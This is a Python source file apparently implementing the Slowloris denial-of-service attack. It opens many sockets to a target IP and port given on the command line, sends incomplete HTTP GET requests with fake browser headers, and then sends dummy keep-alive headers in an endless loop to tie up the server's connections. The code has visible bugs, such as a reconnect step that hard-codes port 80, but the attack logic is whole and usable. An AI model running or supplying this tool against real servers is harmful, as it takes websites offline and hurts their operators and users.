import socket
import random
import time
import sys


print ("\u001b[48;5;17m \u001b[1m \u001b[36;1m ~: Slowloris :~")# \u001b[0m")
    #print u"\u001b[0m"\u001b[1m  Slowloris ")

log_level = 2

def log(text, level=1):
    if log_level >= level:
        print("\u001b[33;1m"+text)

list_of_sockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

if len(sys.argv) < 4:
   print("usage slowloris.py ip port socketCount")
ip = sys.argv[1]
socket_count = int(sys.argv[3])
port = int(sys.argv[2])

log("Attacking {} with {} sockets.".format(ip, socket_count))

log("[!] Creating sockets...")
for _ in range(socket_count):
    try:
        log("    - Creating socket SKT{}".format(_), level=2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, port))
    except socket.error:
        break
    list_of_sockets.append(s)

log("[!] Setting up the sockets...")
for s in list_of_sockets:
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for header in regular_headers:
        s.send(bytes("{}\r\n".format(header).encode("utf-8")))

while True:
    s_count = 0
    #log("[!] Sending keep-alive headers...")
    for s in list_of_sockets:
        print ("    - Sending keep-alive header from SKT" + str(s_count))
        s_count += 1
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
        except socket.error:
            list_of_sockets.remove(s)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, 80))
                for s in list_of_sockets:
                    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                    for header in regular_headers:
                        s.send(bytes("{}\r\n".format(header).encode("utf-8")))
            except socket.error:
                continue

    time.sleep(15)


print ("\u001b[0m")
